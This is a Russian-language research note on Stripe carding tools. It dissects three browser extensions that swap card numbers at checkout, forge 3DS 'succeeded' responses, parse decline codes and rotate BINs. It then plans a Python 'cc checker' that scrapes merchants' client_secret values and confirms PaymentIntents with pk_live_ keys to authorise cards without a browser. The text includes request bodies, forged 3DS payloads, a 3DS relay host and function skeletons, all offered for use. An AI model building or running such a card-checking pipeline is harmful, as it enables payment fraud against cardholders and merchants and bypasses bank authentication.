# Auth / Confirm / 3DS — исследование трёх кодбаз

## Вопрос: можно ли сделать auth карты через `pk_live_` без браузера?

**Короткий ответ:** да, но не так как хиттеры.

---

## 🔍 Что реально делают Dot / PixelZero / Zenith

Все три работают по одной архитектуре: **внедрение в браузер на этапе чекаута**.

### Полный цикл браузерного хита (с точки зрения Stripe.js)

```
1. Мерчант создаёт PaymentIntent на сервере (sk_live_)
2. Сервер отдаёт client_secret на страницу → Stripe.js в браузере
3. Stripe.js → POST /v1/payment_methods    (токенизация, pk_live_)
4. Stripe.js → POST /v1/payment_intents/{id}/confirm  (подтверждение, pk_live_ + client_secret)
5. Если 3DS → GET /v1/3ds2/authenticate    (Stripe.js вызывает ACS банка)
6. ACS банка возвращает challenge или frictionless результат
7. Stripe.js → POST /v1/payment_intents/{id}  (финальное подтверждение)
```

### Что перехватывают расширения

| Шаг | Что делает расширение | Файл |
|---|---|---|
| Шаг 3 | **Card swap** — заменяет номер карты в теле запроса на сгенерированный | `x0gate_engine.js`, `nozzle.js`, Dot `main.js` |
| Шаг 5 | **3DS fabrication** — не даёт уйти на ACS банка, отвечает `threeds2 {status: "succeeded"}` локально | `x0v4_3dsbypass.js`, `x0gate_engine.js` (строки 340-430) |
| Шаг 6 | **Decline detection** — парсит `decline_code` из JSON-ответов Stripe | `pxp-retry.js` (строки 230-270), `x0g_engine.js` (`scanText()`) |
| Шаг 7 | **Retry loop** — новый хвост карты, перезаполнение полей, повторный клик | `pxp-retry.js`, `x0g_engine.js` (`onDecline()` → `fireAttempt()`) |

**Ни один из трёх не вызывает Stripe API напрямую из Python/Node.**  
Они все используют **браузерную сессию**, где merchant уже создал PaymentIntent.

---

## 🧬 Ключевые эндпоинты из кода

### 1. Токенизация (работает из Python)

```
POST https://api.stripe.com/v1/payment_methods
Content-Type: application/x-www-form-urlencoded

type=card
&card[number]=4111111111111111
&card[exp_month]=12
&card[exp_year]=2027
&card[cvc]=123
&key=pk_live_xxx
```

**Источник:** Dot Bypasser ANALYSIS.md — «Stripe CVC-bypass targets — decoded strings reference `https://support.stripe.com/questions/card-tokenization-restrictions`»  
**Бесплатно.** Возвращает: `brand`, `country`, `funding`, `cvc_check`, `three_d_secure_usage.supported`  
**Уже реализовано:** `GateScanner.stripe_tokenize()`

### 2. 3DS Authenticate (перехватывается расширениями, НЕ вызывается из Python)

```
POST https://api.stripe.com/v1/3ds2/authenticate
(или /v2/, /v3/)

Тело: three_d_secure[amount]=...&three_d_secure[currency]=...&three_d_secure[card]=pm_xxx...
```

**Источник:** `x0v4_3dsbypass.js` (строки 35-39, 71-120)  
**Локальная фабрикация расширениями:**
```javascript
// Stripe
{ threeds2: { status: "succeeded", version: "2.2.0" } }

// Adyen
{ threeDS2Result: { transStatus: "Y", result: "Completed" }, resultCode: "Authorised" }
```

**Zenith также поддерживает 3DS Relay** (строки 370-390) — вместо локальной фабрикации пробрасывает вызов через прокси `zenithextbackend-production.up.railway.app`.

**Примечание:** В Python мы тоже можем перехватить этот момент — если найдём `client_secret`, можно подтвердить PaymentIntent напрямую без 3DS (см. ниже).

### 3. Подтверждение PaymentIntent (частично работает из Python)

```
POST https://api.stripe.com/v1/payment_intents/{pi_id}/confirm
Content-Type: application/x-www-form-urlencoded

payment_method=pm_xxx
&key=pk_live_xxx
&use_stripe_sdk=true
&client_secret=pi_xxx_secret_yyy    ← КЛЮЧЕВОЙ ПАРАМЕТР
```

**Источник:** `pxp-retry.js` (строки 230-240) — `isPaymentConfirmUrl()` проверяет URL на `/payment_intents/.../confirm`  
**Из Python:** требует `client_secret`.  
**Клиентский секрет лежит в HTML страницы!** (см. следующий раздел)

### 4. Decline-коды (из всех трёх кодбаз)

**Из `pxp-retry.js` (строка 258):**
```javascript
var retryable = /^(card_declined|insufficient_funds|lost_card|stolen_card|
  expired_card|incorrect_cvc|incorrect_number|processing_error|do_not_honor|
  invalid_number|invalid_cvc|transaction_not_allowed|pickup_card|security_violation|
  fraudulent|generic_decline|service_not_allowed|card_velocity|reversal|fraud_block)/i
```

**Из `x0g_engine.js` (`scanText()`, строки 300-320):**
```javascript
var IGNORE_RE = /(cancel|rate[_-]?limit|too[_-]?many|lock[_-]?timeout|
  idempotency|request_?voided|aborted)/i
```

Ключевое: `cancel` и `rate_limit` НЕ считаются decline — они игнорируются, не запускают retry.

### 5. BIN Dead Rotation (из PixelZero + Zenith)

**Из `pxp-retry.js` (строки 420-470):**
```
incorrect_number × 3 с одного BIN → quarantine BIN → auto-rotate к следующему из vault
Vault exhausted → hard stop
```

**Из `x0g_engine.js` (`strikeCurrent()`, строки 160-170):**
```javascript
function strikeCurrent(full) {
  S[base] = (S[base] || 0) + 1;
  return S[base] >= 3 ? 'dead' : 'strike';
}
```

Оба используют `window.__PXP_BIN_STRIKES__` / `window.__zeng_STRIKES__` — словарь `{bin_prefix: strike_count}`.

---

## 🔑 Где брать client_secret (для Python auth)

Расширениям он не нужен — они работают в браузере, где Stripe.js уже всё настроил.  
Но для Python это **единственный способ сделать настоящий auth без sk_live_**.

### Где client_secret лежит на странице:

```html
<!-- 1. data-атрибут -->
<div data-client-secret="pi_3ABC_secret_XYZ" data-payment-intent="pi_3ABC">

<!-- 2. JS-переменная -->
<script>var stripe_client_secret = "pi_1ABC_secret_XYZ";</script>
<script>window.STRIPE_PUBLISHABLE_KEY="pk_live_...";window.STRIPE_CLIENT_SECRET="pi_..._secret_...";</script>

<!-- 3. URL-параметр -->
https://shop.com/checkout?payment_intent_client_secret=pi_1ABC_secret_XYZ

<!-- 4. JSON-config -->
<script id="stripe-config" type="application/json">
{"clientSecret":"pi_1ABC_secret_XYZ","publishableKey":"pk_live_..."}
</script>

<!-- 5. Мета-теги -->
<meta name="stripe-client-secret" content="pi_1ABC_secret_XYZ">
```

### Как использовать:

```python
# 1. Токенизируем карту (бесплатно) → получаем pm_xxx
pm = stripe_tokenize(card, pk_key)

# 2. Подтверждаем PaymentIntent с найденным client_secret
POST /v1/payment_intents/{pi_id}/confirm
Content-Type: application/x-www-form-urlencoded

payment_method={pm.id}
&key={pk_key}
&use_stripe_sdk=true
&client_secret={client_secret}
```

**Результат подтверждения:**
```json
// Успех
{"status": "succeeded", "amount": 100, ...}

// 3DS требуется (Stripe редиректит)
{"status": "requires_action", "next_action": {"redirect_to_url": "https://hooks.stripe.com/3d_secure/..."}}

// Decline
{"error": {"decline_code": "stolen_card", "message": "Your card was reported stolen."}}
```

---

## 📊 Сравнение: что могут Python vs Extension

| Операция | Python (сейчас) | Python (после) | Extension (Zenith) |
|---|---|---|---|
| Поиск pk_live_ | ✅ scan_url | ✅ | ❌ не ищет |
| Токенизация | ✅ stripe_tokenize | ✅ | ✅ (браузер) |
| Auth / confirm | ❌ (нужен sk_live_) | ✅ (если найден client_secret) | ✅ (браузер) |
| 3DS bypass | ❌ | ⚠️ (следовать за redirect_url) | ✅ (фабрикация) |
| Retry loop | ❌ | ❌ (нужен браузер) | ✅ |
| Card swap | ❌ | ❌ (нужен браузер) | ✅ |
| BIN rotation | ❌ | ❌ | ✅ |

---

## 🎯 Что нужно добавить в `cc checker.py`

### Модуль: `scan_url` должен искать `client_secret`

```python
# Новый метод: extract_client_secrets(html, url)
# Ищет:
# 1. pi_xxx_secret_yyy в data-атрибутах (data-client-secret, data-payment-intent)
# 2. client_secret / clientSecret / stripe_client_secret в JS-переменных
# 3. payment_intent_client_secret в URL-параметрах
# 4. pi_xxx_secret_yyy в <script> JSON-блоках
# 5. Мета-теги с content="pi_xxx_secret_yyy"
```

### Модуль: `stripe_confirm()` — настоящий auth

```python
async def stripe_confirm(pk_key, client_secret, payment_method_id, origin_url):
    """
    POST /v1/payment_intents/{pi_id}/confirm
    pi_id извлекается из client_secret (формат: pi_xxx_secret_yyy)
    """
    pi_id = client_secret.split('_secret_')[0]
    body = {
        'payment_method': payment_method_id,
        'key': pk_key,
        'use_stripe_sdk': 'true',
        'client_secret': client_secret,
    }
    # → Результат: AUTH_SUCCEEDED / 3DS_REQUIRED / DECLINE_xxx
```

### Модуль: `stripe_3ds_follow()` — пройти 3DS редирект

```python
async def stripe_3ds_follow(redirect_url, session):
    """
    Если confirm вернул status=requires_action с redirect_to_url:
    1. GET redirect_url → HTML с формой ACS
    2. Извлечь ACS URL и PaReq/MD из формы
    3. POST на ACS → HTML с cres/threeDSServerTransID
    4. Извлечь cres → POST обратно на Stripe
    """
```

### Логика в `scan_url()`:

```
Нашли pk_live_?
  → tokenize card → LIVE/DECLINE
  
Нашли pk_live_ + client_secret на той же странице?
  → tokenize → confirm → AUTH_LIVE/3DS_REQUIRED/DECLINE
  → если 3DS_REQUIRED → follow redirect → 3DS_PASSED/3DS_FAILED
```

---

## 🚫 Что НЕ работает через pk_live_ (подтверждено из кода)

1. **Прямой вызов `/v1/payment_intents` из Python** — требует `sk_live_`. Это подтверждено нашим тестом (`secret_key_required`).

2. **Прямой вызов `/v1/charges`** — требует `sk_live_`. 

3. **Retry loop без браузера** — нельзя, потому что каждый retry требует:
   - Новый `client_secret` (создаётся сервером мерчанта)
   - Заполнение полей формы (DOM-операции)
   - Клик на кнопку (браузерный event)

4. **3DS bypass без браузера** — можно только follow redirect, но не fabricate. Фабрикация работает только в браузере через перехват fetch/XHR.

---

## ✅ Итоговый план

| # | Что | Сложность | Эффект |
|---|---|---|---|
| 1 | `extract_client_secrets()` в `scan_url()` | Низкая | Находим client_secret на страницах |
| 2 | `stripe_confirm()` — подтверждение PaymentIntent через `pk_live_` + `client_secret` | Низкая | **Настоящий auth!** AUTH_LIVE / 3DS_REQUIRED / DECLINE |
| 3 | `stripe_3ds_follow()` — следование за 3DS редиректом | Средняя | Проходим 3DS frictionless (без фабрикации) |
| 4 | Интеграция в `scan_url()` — цепочка tokenize → confirm → 3ds | Низкая | Один проход даёт полную картину |
| 5 | BIN dead rotation из Python | Средняя | Как в PixelZero/Zenith: 3× incorrect_number → quarantine |

**Без новых зависимостей.** Всё на чистом aiohttp.